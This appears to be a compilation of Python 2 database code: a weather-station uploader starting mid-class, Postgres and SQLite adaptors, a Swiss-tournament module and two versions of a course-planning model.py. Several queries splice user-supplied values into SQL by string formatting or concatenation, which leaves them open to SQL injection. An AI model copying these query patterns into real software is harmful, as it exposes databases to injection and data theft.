        success = False
        response_data = None

        while not success and attempt < attempts:
            try:
                self.conn.request("POST", self.path, None, headers)
                response = self.conn.getresponse()
                response_data = response.read()
                print response.status, response.reason, response_data                    
                success = response.status == 200 or response.status == 201
            except Exception as e:
                print "Unexpected error", e                    
            finally:
                attempt += 1

        return response_data if success else None

    def __del__(self):
        self.conn.close()

class weather_database:
    def __init__(self):
        self.db = mysql_database()
        self.insert_template = "INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');"                    
        self.update_template =  "UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};"                    
        self.upload_select_template = "SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;"

    def is_number(self, s):
        try:
            float(s)
            return True
        except ValueError:
            return False

    def is_none(self, val):
        return val if val != None else "NULL"

    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")):
        insert_query = self.insert_template.format(                    
            self.is_none(ambient_temperature),                     
            self.is_none(ground_temperature),                     
            self.is_none(air_quality),                     
            self.is_none(air_pressure),                     
            self.is_none(humidity),                     
            self.is_none(wind_direction),                     
            self.is_none(wind_speed),                     
            self.is_none(wind_gust_speed),                     
            self.is_none(rainfall),                     
            created)                    

        print insert_query                    

        self.db.execute(insert_query)                    

    def upload(self):
        results = self.db.query(self.upload_select_template)

        rows_count = len(results)
        if rows_count > 0:
            print rows_count, "rows to send..."                    
            odb = oracle_apex_database(path = "/pls/apex/raspberrypi/weatherstation/submitmeasurement")

            if odb.credentials == None:
                return #cannot upload

            for row in results:
                response_data = odb.upload(
                    row["ID"], 
                    row["AMBIENT_TEMPERATURE"], 
                    row["GROUND_TEMPERATURE"],
                    row["AIR_QUALITY"], 
                    row["AIR_PRESSURE"], 
                    row["HUMIDITY"], 
                    row["WIND_DIRECTION"], 
                    row["WIND_SPEED"], 
                    row["WIND_GUST_SPEED"], 
                    row["RAINFALL"], 
                    row["CREATED"].strftime("%Y-%m-%dT%H:%M:%S"))

                if response_data != None and response_data != "-1":
                    json_dict = json.loads(response_data)
                    oracle_id = json_dict["ORCL_RECORD_ID"]
                    if self.is_number(oracle_id):
                        local_id = str(row["ID"])
                        update_query = self.update_template.format(oracle_id, local_id)                    
                        self.db.execute(update_query)                    
                        print "ID:", local_id, "updated with REMOTE_ID =", oracle_id                    
                else:
                    print "Bad response from Oracle"                    
        else:
            print "Nothing to upload"                    


#!/usr/bin/env python
'''
ooiservices.adaptor.postgresadaptor

Definitions for the PostgresAdaptor
'''

__author__ = 'Edna Donoughe'

import psycopg2
import psycopg2.extras

class PostgresAdaptor(object):
    database = None
    username = None
    password = None
    host     = None
    port     = None

    def __init__(self, database=None, username=None, password=None, host=None, port=None):
        object.__init__(self)
        self.database = database
        self.username = username
        self.password = password
        self.host = host
        self.port = port

    def get_db(self):
        try:
            conn = psycopg2.connect(database=self.database, user=self.username, password=self.password, host=self.host, port=self.port)
            return conn
        except psycopg2.DatabaseError, e:
            raise Exception('<PostgresAdaptor> connect failed (check config): %s: ' % e)
        except:
            raise Exception('<PostgresAdaptor> get_db failed to connect; check config settings')

    def perform(self, query, arg_list=None):                    
        #Create a cursor_factory to return dictionary
        conn = self.get_db()
        try:

            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)                    
            if arg_list:                    
                c.execute(query, arg_list)                    
            else:                    
                c.execute(query)                    

            result = c.fetchall()                    
            conn.commit()

        except psycopg2.DatabaseError, e:
            raise Exception('<PostgresAdaptor> perform failed: %s: ' % e)

        finally:
            if conn:
                conn.close()

        return result

#!/usr/bin/env python
'''
ooiservices.adaptor.sqlite

Definitions for the SQLiteAdaptor
'''

__author__ = 'Matt Campbell'

import sqlite3 as lite

class SQLiteAdaptor(object):
    db = None

    def __init__(self,dbName):
        object.__init__(self)
        self.db = dbName

    def get_db(self):
        if self.db:
            conn = lite.connect(self.db)
            return conn

    def perform(self, query, obj=None):                    
        #Create a factory to return dictionary
        def dict_factory(cursor, row):
            d = {}
            for idx, col in enumerate(cursor.description):
                d[col[0]] = row[idx]
            return d
        conn = self.get_db()
        conn.row_factory = dict_factory
        c = conn.cursor()

        try:
            if lite.complete_statement(query):
                if obj:                    
                    c.execute(query, obj)                    
                else:                    
                    c.execute(query)                    

            result = c.fetchall()
            #possibly condition commit to only insert/update/delete.
            conn.commit()

        except lite.Error, e:
            result = '%s' % e.args[0]
            print query

        finally:
            if conn:
                conn.close()
        return result


#!/usr/bin/env python
'''
ooiservices.adaptor.postgresadaptor

Definitions for the PostgresAdaptor
'''

__author__ = 'Edna Donoughe'

import psycopg2
import psycopg2.extras

class PostgresAdaptor(object):
    database = None
    username = None
    password = None
    host     = None
    port     = None

    def __init__(self, database=None, username=None, password=None, host=None, port=None):
        object.__init__(self)
        self.database = database
        self.username = username
        self.password = password
        self.host = host
        self.port = port

    def get_db(self):
        try:
            conn = psycopg2.connect(database=self.database, user=self.username, password=self.password, host=self.host, port=self.port)
            return conn
        except psycopg2.DatabaseError, e:
            raise Exception('<PostgresAdaptor> connect failed (check config): %s: ' % e)
        except:
            raise Exception('<PostgresAdaptor> get_db failed to connect; check config settings')

    def perform(self, query, arg_list=None):                    
        #Create a cursor_factory to return dictionary
        conn = self.get_db()
        try:

            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)                    
            if arg_list:                    
                c.execute(query, arg_list)                    
            else:                    
                c.execute(query)                    

            result = c.fetchall()                    
            conn.commit()

        except psycopg2.DatabaseError, e:
            raise Exception('<PostgresAdaptor> perform failed: %s: ' % e)

        finally:
            if conn:
                conn.close()

        return result

#!/usr/bin/env python
'''
ooiservices.adaptor.sqlite

Definitions for the SQLiteAdaptor
'''

__author__ = 'Matt Campbell'

import sqlite3 as lite

class SQLiteAdaptor(object):
    db = None

    def __init__(self,dbName):
        object.__init__(self)
        self.db = dbName

    def get_db(self):
        if self.db:
            conn = lite.connect(self.db)
            return conn

    def perform(self, query, obj=None):                    
        #Create a factory to return dictionary
        def dict_factory(cursor, row):
            d = {}
            for idx, col in enumerate(cursor.description):
                d[col[0]] = row[idx]
            return d
        conn = self.get_db()
        conn.row_factory = dict_factory
        c = conn.cursor()

        try:
            if lite.complete_statement(query):
                if obj:                    
                    c.execute(query, obj)                    
                else:                    
                    c.execute(query)                    

            result = c.fetchall()
            #possibly condition commit to only insert/update/delete.
            conn.commit()

        except lite.Error, e:
            result = '%s' % e.args[0]
            print query

        finally:
            if conn:
                conn.close()
        return result


#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2
from itertools import izip_longest

DBNAME = 'tournament'


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=%s" % DBNAME)


def _commit(query):
    '''Connext, commit query, and close

    TODO:
        Do we really neer to open and close each time?
    '''
    c = connect()
    c.cursor().execute(query)
    c.commit()
    c.close()


def deleteMatches():
    """Remove all the match records from the database."""
    _commit('DELETE FROM matches')

def deletePlayers():
    """Remove all the player records from the database."""
    _commit('DELETE FROM players')


def countPlayers():
    """Returns the number of players currently registered."""
    c = connect()
    cur = c.cursor()
    cur.execute('SELECT COUNT(*) from players;')
    res = cur.fetchone()[0]
    c.close()
    return res


def registerPlayer(name):
    """Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """
    c = connect()
    c.cursor().execute('INSERT INTO players(name) VALUES (%s)', (name,))
    c.commit()
    c.close()


#  TODO: make into a view?
STANDINGS_QUERY = '''
SELECT players.id as id,
       players.name as name,
       (SELECT COUNT(*) FROM matches WHERE players.id = matches.winner_id) as wins,
       (SELECT COUNT(*) FROM matches WHERE players.id = matches.winner_id or players.id = matches.loser_id) as matches
FROM players ORDER BY wins DESC;
'''


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """
    c = connect()
    cur = c.cursor()
    cur.execute(STANDINGS_QUERY)
    res = cur.fetchall()
    c.close()
    return res




def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost

    Raises:
        ValueError is pairing already registered or winner == loser
    """
    c = connect()
    cur = c.cursor()

    def _checkPairing():
        if winner == loser:
            raise ValueError('Attempt to match player against self')

        q = '''
        SELECT COUNT(*) FROM matches
        WHERE (matches.winner_id = %s AND matches.loser_id = %s)
              OR (matches.winner_id = %s AND matches.loser_id = %s);
        ''' % (winner, loser, loser, winner)                    
        cur.execute(q)                    
        if cur.fetchone()[0] > 0:
            raise ValueError('Pairing %s, %s already played' % (winner, loser))

    _checkPairing()

    cur.execute(
        'INSERT INTO matches(winner_id, loser_id) VALUES (%s, %s)',
        (winner, loser))
    c.commit()
    c.close()


def swissPairings():
    """Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """

    # Standings lists players ordered by number of wins. We construct the
    # swiss pairings from consecutive entries in the standings list. These have
    # the closest number of wins by definition.
    # We use a grouper function to iterate over the standings list in groups
    # of two consecutive elements without overlap.
    # TODO: extend for odd numbers

    def grouper(iterable, n, fillvalue=None):
        '''Collect data into fixed-length chunks or blocks

        Taken from  itertools documentation:
            https://docs.python.org/2/library/itertools.html

        grouper('ABCDEFG', 3, 'x') --> ABC DEF Gxx
        '''
        args = [iter(iterable)] * n
        return izip_longest(fillvalue=fillvalue, *args)

    standings = playerStandings()
    pairings = [(a[0], a[1], b[0], b[1])
                for a, b in grouper(standings, 2)]

    return pairings

'''
    model.py
    Handles queries to the database
'''

import hashlib
import components.database_adapter # database_adaptor.py handles the connection to database
import psycopg2

## Connects to the postgres database
CONNECTION = components.database_adapter.connect_db()
DB_CURSOR = CONNECTION.cursor()


def get_all_modules():
    '''
        Get the module code, name, description, and MCs of all modules
    '''
    sql_command = "SELECT * FROM module ORDER BY code"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_module(code):
    '''
        Get the module code, name, description and MCs of a single module
    '''
    sql_command = "SELECT * FROM module WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code,))
    return DB_CURSOR.fetchone()


def get_all_fixed_mounted_modules():
    '''
        Get the module code, name, AY/Sem and quota of all fixed mounted modules
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                    "FROM module m1, moduleMounted m2 WHERE m2.moduleCode = m1.code " +\
                    "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_mounted_modules():
    '''
        Get the module code, name, AY/Sem and quota of all tentative mounted modules
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                    "FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code " +\
                    "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_mounted_modules_of_selected_ay(selected_ay):
    '''
        Get the module code, name, AY/Sem and quota of all tenta mounted mods of a selected AY
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                  "FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code " +\
                  "AND M2.acadYearAndSem LIKE '" + selected_ay + "%' " +\                    
                  "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_first_fixed_mounting():
    '''
        Get the first mounting from the fixed mounting table
        This is used for reading the current AY
    '''
    sql_command = "SELECT acadYearAndSem FROM moduleMounted LIMIT(1)"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchone()


def get_all_fixed_ay_sems():
    '''
        Get all the distinct AY/Sem in the fixed mounting table
    '''
    sql_command = "SELECT DISTINCT acadYearAndSem FROM moduleMounted " +\
                  "ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_ay_sems():
    '''
        Get all the distinct AY/Sem in the tentative mounting table
    '''
    sql_command = "SELECT DISTINCT acadYearAndSem FROM moduleMountTentative " +\
                  "ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_fixed_mounting_and_quota(code):
    '''
        Get the fixed AY/Sem and quota of a mounted module
    '''
    sql_command = "SELECT acadYearAndSem, quota FROM moduleMounted " +\
                  "WHERE moduleCode=%s ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def get_tenta_mounting_and_quota(code):
    '''
        Get the tentative AY/Sem and quota of a mounted module
    '''
    sql_command = "SELECT acadYearAndSem, quota FROM moduleMountTentative " +\
                  "WHERE moduleCode=%s ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def get_quota_of_target_fixed_ay_sem(code, ay_sem):
    '''
        Get the quota of a mod in a target fixed AY/Sem (if any)
    '''
    sql_command = "SELECT quota FROM moduleMounted " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s "
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    return DB_CURSOR.fetchall()


def get_quota_of_target_tenta_ay_sem(code, ay_sem):
    '''
        Get the quota of a mod in a target tentative AY/Sem (if any)
    '''
    sql_command = "SELECT quota FROM moduleMountTentative " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s "
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    return DB_CURSOR.fetchall()


def get_number_students_planning(code):
    '''
        Get the number of students planning to take a mounted module
    '''
    sql_command = "SELECT COUNT(*), acadYearAndSem FROM studentPlans WHERE " +\
                    "moduleCode=%s GROUP BY acadYearAndSem ORDER BY acadYearAndSem"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def add_module(code, name, description, module_credits, status):
    '''
        Insert a module into the module table.
        Returns true if successful, false if duplicate primary key detected
    '''
    sql_command = "INSERT INTO module VALUES (%s,%s,%s,%s,%s)"
    try:
        DB_CURSOR.execute(sql_command, (code, name, description, module_credits, status))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def update_module(code, name, description, module_credits):
    '''
        Update a module with edited info
    '''
    sql_command = "UPDATE module SET name=%s, description=%s, mc=%s " +\
                  "WHERE code=%s"
    try:
        DB_CURSOR.execute(sql_command, (name, description, module_credits, code))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def flag_module_as_removed(code):
    '''
        Change the status of a module to 'To Be Removed'
    '''
    sql_command = "UPDATE module SET status='To Be Removed' WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code, ))
    CONNECTION.commit()


def flag_module_as_active(code):
    '''
        Change the status of a module to 'Active'
    '''
    sql_command = "UPDATE module SET status='Active' WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code, ))
    CONNECTION.commit()


def delete_module(code):
    '''
        Delete a module from the module table
    '''
    # Delete the foreign key reference first.
    sql_command = "DELETE FROM modulemounted WHERE modulecode=%s"
    DB_CURSOR.execute(sql_command, (code,))

    # Perform the normal delete.
    sql_command = "DELETE FROM module WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code,))
    CONNECTION.commit()


def get_oversub_mod():
    '''
        Retrieves a list of modules which are oversubscribed.
        Returns module, AY/Sem, quota, number students interested
        i.e. has more students interested than the quota
    '''
    list_of_oversub_with_info = []
    list_all_mod_info = get_all_modules()

    for module_info in list_all_mod_info:
        mod_code = module_info[0]

        aysem_quota_fixed_list = get_fixed_mounting_and_quota(mod_code)
        aysem_quota_tenta_list = get_tenta_mounting_and_quota(mod_code)
        aysem_quota_merged_list = aysem_quota_fixed_list + \
                                aysem_quota_tenta_list

        num_student_plan_aysem_list = get_number_students_planning(mod_code)
        for num_plan_aysem_pair in num_student_plan_aysem_list:
            num_student_planning = num_plan_aysem_pair[0]
            ay_sem = num_plan_aysem_pair[1]
            real_quota = get_quota_in_aysem(ay_sem, aysem_quota_merged_list)

            # ensures that quota will be a number which is not None
            if real_quota is None:
                quota = 0
                real_quota = '?'
            else:
                quota = real_quota

            if num_student_planning > quota:
                oversub_info = (mod_code, ay_sem, real_quota, num_student_planning)
                list_of_oversub_with_info.append(oversub_info)

    return list_of_oversub_with_info


def get_quota_in_aysem(ay_sem, aysem_quota_merged_list):
    '''
        This is a helper function.
        Retrieves the correct quota from ay_sem listed inside
        aysem_quota_merged_list parameter.
    '''
    for aysem_quota_pair in aysem_quota_merged_list:
        aysem_in_pair = aysem_quota_pair[0]
        if ay_sem == aysem_in_pair:
            quota_in_pair = aysem_quota_pair[1]

            return quota_in_pair

    return None # quota not found in list


def add_admin(username, salt, hashed_pass):
    '''
        Register an admin into the database.
        Note: to change last argument to false once
        activation done
    '''
    sql_command = "INSERT INTO admin VALUES (%s, %s, %s, FALSE, TRUE)"
    DB_CURSOR.execute(sql_command, (username, salt, hashed_pass))
    CONNECTION.commit()


def is_userid_taken(userid):
    '''
        Retrieves all account ids for testing if a user id supplied
        during account creation
    '''
    sql_command = "SELECT staffid FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (userid,))

    result = DB_CURSOR.fetchall()
    return len(result) != 0


def delete_admin(username):
    '''
        Delete an admin from the database.
    '''
    # Delete the foreign key references first.
    sql_command = "DELETE FROM starred WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))

    sql_command = "DELETE FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))
    CONNECTION.commit()


def validate_admin(username, unhashed_pass):
    '''
        Check if a provided admin-password pair is valid.
    '''
    sql_command = "SELECT salt, password FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))
    admin = DB_CURSOR.fetchall()
    if not admin:
        return False
    else:
        hashed_pass = hashlib.sha512(unhashed_pass + admin[0][0]).hexdigest()
        is_valid = (admin[0][1] == hashed_pass)
        return is_valid


def add_fixed_mounting(code, ay_sem, quota):
    '''
        Insert a new mounting into fixed mounting table
    '''
    try:
        sql_command = "INSERT INTO modulemounted VALUES (%s,%s,%s)"
        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def delete_fixed_mounting(code, ay_sem):
    '''
        Delete a mounting from the fixed mounting table
    '''
    sql_command = "DELETE FROM modulemounted WHERE moduleCode=%s AND acadYearAndSem=%s"
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    CONNECTION.commit()


def add_tenta_mounting(code, ay_sem, quota):
    '''
        Insert a new mounting into tentative mounting table
    '''
    try:
        sql_command = "INSERT INTO moduleMountTentative VALUES (%s,%s,%s)"
        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def update_quota(code, ay_sem, quota):
    '''
        Update the quota of a module in a target tentative AY/Sem
    '''
    sql_command = "UPDATE moduleMountTentative SET quota=%s " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s"
    try:
        DB_CURSOR.execute(sql_command, (quota, code, ay_sem))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def delete_tenta_mounting(code, ay_sem):
    '''
        Delete a mounting from the tentative mounting table
    '''
    sql_command = "DELETE FROM moduleMountTentative WHERE moduleCode=%s AND acadYearAndSem=%s"
    try:
        DB_CURSOR.execute(sql_command, (code, ay_sem))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def get_num_students_by_yr_study():
    '''
        Retrieves the number of students at each year of study as a table
        Each row will contain (year, number of students) pair.
        e.g. [(1, 4), (2, 3)] means four year 1 students
        and two year 3 students
    '''
    INDEX_FIRST_ELEM = 0

    sql_command = "SELECT year, COUNT(*) FROM student GROUP BY year" + \
        " ORDER BY year"
    DB_CURSOR.execute(sql_command)                    

    table_with_non_zero_students = DB_CURSOR.fetchall()
    final_table = append_missing_year_of_study(table_with_non_zero_students)

    # Sort the table based on year
    final_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])

    return final_table


def append_missing_year_of_study(initial_table):
    '''
        Helper function to append missing years of study to the
        given initial table.
        initial_table given in lists of (year, number of students)
        pair.
        e.g. If year 5 is missing from table, appends (5,0) to table
        and returns the table
    '''
    MAX_POSSIBLE_YEAR = 6
    for index in range(0, MAX_POSSIBLE_YEAR):
        year = index + 1
        year_exists_in_table = False

        for year_count_pair in initial_table:
            req_year = year_count_pair[0]
            if req_year == year:
                year_exists_in_table = True
                break

        if not year_exists_in_table:
            initial_table.append((year, 0))

    return initial_table


def get_num_students_by_focus_area_non_zero():
    '''
        Retrieves the number of students for each focus area as a table,
        if no student is taking that focus area, that row will not be
        returned.
        Each row will contain (focus area, number of students) pair.
        See: get_num_students_by_focus_areas() for more details.
    '''
    sql_command = "SELECT f.name, COUNT(*) FROM focusarea f, takesfocusarea t" + \
        " WHERE f.name = t.focusarea1 OR f.name = t.focusarea2 GROUP BY f.name"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()


def get_focus_areas_with_no_students_taking():
    '''
        Retrieves a list of focus areas with no students taking.
    '''
    sql_command = "SELECT f2.name FROM focusarea f2 WHERE NOT EXISTS(" + \
        "SELECT f.name FROM focusarea f, takesfocusarea t " + \
        "WHERE (f.name = t.focusarea1 OR f.name = t.focusarea2) " + \
        "AND f2.name = f.name GROUP BY f.name)"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()


def get_number_students_without_focus_area():
    '''
        Retrieves the number of students who have not indicated their focus
        area.
    '''
    sql_command = "SELECT COUNT(*) FROM takesfocusarea WHERE " + \
        "focusarea1 IS NULL AND focusarea2 IS NULL"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchone()


def get_num_students_by_focus_areas():
    '''
        Retrieves the number of students for each focus area as a table
        Each row will contain (focus area, number of students) pair
        e.g. [(AI, 4), (Database, 3)] means four students taking AI as
        focus area and three students taking database as focus area.
        Note: A student taking double focus on AI and Database will be
        reflected once for AI and once for database (i.e. double counting)
    '''
    INDEX_FIRST_ELEM = 0

    table_with_non_zero_students = get_num_students_by_focus_area_non_zero()
    table_with_zero_students = get_focus_areas_with_no_students_taking()

    temp_table = table_with_non_zero_students

    # Loops through all focus areas with no students taking and add them to
    # the table with (focus area, number of students) pair.
    for focus_area_name in table_with_zero_students:
        temp_table.append((focus_area_name[INDEX_FIRST_ELEM], 0))

    # Sort the table based on focus area
    temp_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])

    # Build the final table with info of students without focus area.
    num_students_without_focus = \
    get_number_students_without_focus_area()[INDEX_FIRST_ELEM]

    temp_table.insert(INDEX_FIRST_ELEM,
                      ("Have Not Indicated", num_students_without_focus))
    final_table = temp_table

    return final_table

def get_mod_taken_together_with(code):
    '''
        Retrieves the list of modules taken together with the specified
        module code in the same semester.

        Returns a table of lists (up to 10 top results). Each list contains
        (specified code, module code of mod taken together, aySem, number of students)

        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students
        taking CS1010 and CS1231 together in AY 16/17 Sem 1.
    '''
    NUM_TOP_RESULTS_TO_RETURN = 10

    sql_command = "SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) " + \
                "FROM studentPlans sp1, studentPlans sp2 " + \
                "WHERE sp1.moduleCode = '" + code + "' AND " + \
                "sp2.moduleCode <> sp1.moduleCode AND " + \
                "sp1.studentId = sp2.studentId AND " + \
                "sp1.acadYearAndSem = sp2.acadYearAndSem " + \
                "GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem " + \
                "ORDER BY COUNT(*) DESC"

    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchmany(NUM_TOP_RESULTS_TO_RETURN)

def get_all_mods_taken_together():
    '''
        Retrieves the list of all modules taken together in the same semester.

        Returns a table of lists. Each list contains
        (module code 1, module code 2, aySem, number of students)
        where module code 1 and module code 2 are the 2 mods taken together
        in the same semester.

        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students
        taking CS1010 and CS1231 together in AY 16/17 Sem 1.
    '''

    sql_command = "SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) " + \
                "FROM studentPlans sp1, studentPlans sp2 " + \
                "WHERE sp1.moduleCode < sp2.moduleCode AND " + \
                "sp1.studentId = sp2.studentId AND " + \
                "sp1.acadYearAndSem = sp2.acadYearAndSem " + \
                "GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem " + \
                "ORDER BY COUNT(*) DESC"

    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()

'''
    model.py
    Handles queries to the database
'''

import hashlib
import components.database_adapter # database_adaptor.py handles the connection to database
import psycopg2

## Connects to the postgres database
CONNECTION = components.database_adapter.connect_db()
DB_CURSOR = CONNECTION.cursor()


def get_all_modules():
    '''
        Get the module code, name, description, and MCs of all modules
    '''
    sql_command = "SELECT * FROM module ORDER BY code"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_module(code):
    '''
        Get the module code, name, description and MCs of a single module
    '''
    sql_command = "SELECT * FROM module WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code,))
    return DB_CURSOR.fetchone()


def get_all_fixed_mounted_modules():
    '''
        Get the module code, name, AY/Sem and quota of all fixed mounted modules
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                    "FROM module m1, moduleMounted m2 WHERE m2.moduleCode = m1.code " +\
                    "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_mounted_modules():
    '''
        Get the module code, name, AY/Sem and quota of all tentative mounted modules
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                    "FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code " +\
                    "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_mounted_modules_of_selected_ay(selected_ay):
    '''
        Get the module code, name, AY/Sem and quota of all tenta mounted mods of a selected AY
    '''
    sql_command = "SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota " +\
                  "FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code " +\
                  "AND M2.acadYearAndSem LIKE %s" + \
                  "ORDER BY m2.moduleCode, m2.acadYearAndSem"
    processed_ay = selected_ay + "%"

    DB_CURSOR.execute(sql_command, (processed_ay,))
    return DB_CURSOR.fetchall()


def get_first_fixed_mounting():
    '''
        Get the first mounting from the fixed mounting table
        This is used for reading the current AY
    '''
    sql_command = "SELECT acadYearAndSem FROM moduleMounted LIMIT(1)"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchone()


def get_all_fixed_ay_sems():
    '''
        Get all the distinct AY/Sem in the fixed mounting table
    '''
    sql_command = "SELECT DISTINCT acadYearAndSem FROM moduleMounted " +\
                  "ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_all_tenta_ay_sems():
    '''
        Get all the distinct AY/Sem in the tentative mounting table
    '''
    sql_command = "SELECT DISTINCT acadYearAndSem FROM moduleMountTentative " +\
                  "ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command)                    
    return DB_CURSOR.fetchall()


def get_fixed_mounting_and_quota(code):
    '''
        Get the fixed AY/Sem and quota of a mounted module
    '''
    sql_command = "SELECT acadYearAndSem, quota FROM moduleMounted " +\
                  "WHERE moduleCode=%s ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def get_tenta_mounting_and_quota(code):
    '''
        Get the tentative AY/Sem and quota of a mounted module
    '''
    sql_command = "SELECT acadYearAndSem, quota FROM moduleMountTentative " +\
                  "WHERE moduleCode=%s ORDER BY acadYearAndSem ASC"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def get_quota_of_target_fixed_ay_sem(code, ay_sem):
    '''
        Get the quota of a mod in a target fixed AY/Sem (if any)
    '''
    sql_command = "SELECT quota FROM moduleMounted " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s "
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    return DB_CURSOR.fetchall()


